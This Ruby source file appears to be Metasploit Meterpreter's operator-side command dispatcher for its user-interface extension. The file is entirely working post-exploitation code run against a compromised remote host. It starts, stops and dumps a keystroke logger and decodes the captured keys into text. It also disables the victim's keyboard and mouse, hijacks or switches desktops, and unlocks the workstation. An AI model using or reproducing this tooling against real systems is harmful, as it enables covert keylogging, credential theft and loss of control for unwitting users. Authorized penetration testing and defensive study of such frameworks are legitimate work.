require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The user interface portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Ui

	Klass = Console::CommandDispatcher::Stdapi::Ui

	include Console::CommandDispatcher

	#
	# List of supported commands.
	#
	def commands
		{
			"idletime"      => "Returns the number of seconds the remote user has been idle",
			"uictl"         => "Control some of the user interface components",
			"enumdesktops"  => "List all accessible desktops and window stations",
			"setdesktop"    => "Move to a different workstation and desktop",
			"keyscan_start" => "Start capturing keystrokes",
			"keyscan_stop"  => "Stop capturing keystrokes",
			"keyscan_dump"  => "Dump they keystroke buffer",
			
			# no longer needed with setdesktop
			# "grabinputdesktop" => "Take over the active input desktop",
			
			#  not working yet
			# "unlockdesktop" => "Unlock or lock the workstation (must be inside winlogon.exe)",
		}
	end

	#
	# Name for this dispatcher.
	#
	def name
		"Stdapi: User interface"
	end

	#
	# Executes a command with some options.
	#
	def cmd_idletime(*args)
		seconds = client.ui.idle_time

		print_line(
			"User has been idle for: #{Rex::ExtTime.sec_to_s(seconds)}")
		
		return true
	end

	#
	# Enables/disables user interface mice and keyboards on the remote machine.
	#
	def cmd_uictl(*args)
		if (args.length < 2)
			print_line(
				"Usage: uictl [enable/disable] [keyboard/mouse]")
			return true
		end

		case args[0]
			when 'enable'
				case args[1]
					when 'keyboard'
						print_line("Enabling keyboard...")
						client.ui.enable_keyboard
					when 'mouse'
						print_line("Enabling mouse...")
						client.ui.enable_mouse
					else
						print_error("Unsupported user interface device: #{args[1]}")
				end
			when 'disable'
				case args[1]
					when 'keyboard'
						print_line("Disabling keyboard...")
						client.ui.disable_keyboard
					when 'mouse'
						print_line("Disabling mouse...")
						client.ui.disable_mouse
					else
						print_error("Unsupported user interface device: #{args[1]}")
				end
			else
				print_error("Unsupported command: #{args[0]}")
		end

		return true
	end
	
	#
	# Hijack the input desktop
	#
	def cmd_grabinputdesktop(*args)
		print_line("Trying to hijack the input desktop...")
		client.ui.grab_input_desktop
		return true
	end	
	
	#
	# Enumerate desktops
	#
	def cmd_enumdesktops(*args)
		print_line("Enumerating all accessible desktops")
		client.ui.enum_desktops.each do |d|
			print_line(" - #{d}")
		end
		return true
	end	

	#
	# Take over a specific desktop
	#
	def cmd_setdesktop(*args)
		if(args.length == 0)
			print_line("Usage: setdesktop [workstation\\\\desktop]")
			return
		end
		
		print_line("Changing to desktop #{args[0]}")
		client.ui.set_desktop(*args)
		return true
	end	

	#
	# Unlock or lock the desktop
	#
	def cmd_unlockdesktop(*args)
		mode = 0
		if(args.length > 0)
			mode = args[0].to_i
		end
		
		if(mode == 0)
			print_line("Unlocking the workstation...")
			client.ui.unlock_desktop(true)
		else
			print_line("Locking the workstation...")
			client.ui.unlock_desktop(false)	
		end

		return true
	end	
			
	#
	# Start the keyboard sniffer
	#
	def cmd_keyscan_start(*args)
		print_line("Starting the keystroke sniffer...")	
		client.ui.keyscan_start
		return true
	end	
	
	#
	# Stop the keyboard sniffer
	#
	def cmd_keyscan_stop(*args)
		print_line("Stopping the keystroke sniffer...")		
		client.ui.keyscan_stop
		return true
	end	

	#
	# Dump captured keystrokes
	#
	def cmd_keyscan_dump(*args)
		print_line("Dumping captured keystrokes...")			
		data = client.ui.keyscan_dump
		outp = ""
		data.unpack("n*").each do |inp|
			fl = (inp & 0xff00) >> 8
			vk = (inp & 0xff)
			kc = VirtualKeyCodes[vk]
			
			f_shift = fl & (1<<1)
			f_ctrl  = fl & (1<<2)
			f_alt   = fl & (1<<3)
	
			if(kc)
				name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
				case name
				when /^.$/
					outp << name
				when /shift|click/i
				when 'Space'
					outp << " "
				else
					outp << " <#{name}> "
				end
			else
				outp << " <0x%.2x> " % vk
			end
		end
		print_line(outp)
		
		return true
	end	
			
end

end
end
end
end
